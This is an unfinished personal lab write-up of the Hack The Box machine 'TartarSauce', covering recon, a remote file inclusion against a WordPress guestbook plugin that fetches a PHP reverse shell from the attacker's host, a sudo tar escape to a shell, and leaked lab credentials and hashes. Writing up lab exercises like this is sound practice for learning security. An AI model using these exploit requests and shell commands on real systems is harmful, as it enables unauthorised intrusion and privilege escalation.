202210051844
Status: #idea
Tags: [[Labs]]

# TartarSauce
ip: 10.10.10.88

## Recon

Ports Open:

```
PORT   STATE SERVICE
80/tcp open  http
```

Full Nmap Scan:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-title: Landing Page
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

Port 80:

- Apache httpd 2.4.18
- robots.txt:

```
/webservices/tar/tar/source/ #404
/webservices/monstra-3.0.4/ #200 - Interesting!!!!
/webservices/easy-file-uploader/ #404
/webservices/developmental/ #404
/webservices/phpmyadmin/ #404
```

- Directory listing:

```
/robots.txt
/webservices
	/webservices/wp/
```

- `/webservices/wp/` reveals a domain to associate with the ip
	- `tartarsauce.htb`
- /webservices/monstra-3.0.4/robots.txt

```
/admin/
/engine/
/libraries/
/plugins/
```

- Directory listing inside /webservices/monstra-3.0.4:

```
/rss.php #200 Interesting
/public #401
/admin #200 Login Portal
/storage #401
/plugins #401
/index.php #200
/engine #401
/libraries #401
/robots.txt #200
/tmp #401
/boot #401
/backups #401
```
- Found Interesting Information Disclosure in `http://tartarsauce.htb/webservices/monstra-3.0.4/storage/database/users.table.xml`:

```
<users>
<id>1</id>
<uid>af45a48ed8</uid>
<password>5d1e3697d706b0e24e574b56e79affda</password>
<hash>jB64OpMOWGxq</hash>
<date_registered>1519235295</date_registered>
<login>admin</login>
<firstname/>
<lastname/>
<email>test@test.local</email>
<skype/>
<twitter/>
<about_me>I like falafel with tartar sauce.</about_me>
<role>admin</role>
</users>
</root>
```

- wpscan returned a plugin gwolle that is possibly vulnerable to a Remote File Inclusion

## Exploitation

- CVE-2015-8351: https://www.exploit-db.com/exploits/38861
- `http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]`
- PoC:

```
#Request

http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/

#Output

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)
10.10.10.88 - [06/Oct/2022 19:50:14] code 404, message File not found
10.10.10.88 - [06/Oct/2022 19:50:14] "GET /wp-load.php HTTP/1.0" 404
```

- It requests a file `wp-load.php`
- We can use a php reverse shell file and rename it to what the request is asking for and we get a reverse shell

## Post Exploitation

- www-data can run sudo as user onuma for binary tar
- GTFOBins allows us to laterally move to onuma with these sudo priveleges

```bash
sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

- Interesting things found with linpeas:
```
DB_creds: wpuser:w0rdpr3$$d@t@b@$3@cc3$$
Possible cron: /bin/bash /usr/sbin/backuperer
/var/backups/onuma_backup_test.txt
/var/tmp/.95d5c9c5c443ddc8d2e89d2cf86bc348c06c7e81
/var/backups/onuma_backup_error.txt
/lib/systemd/system/backuperer.service
/lib/systemd/system/backuperer.timer
/var/backups/onuma-www-dev.bak
```

TO BE CONTINUED...








---
# References
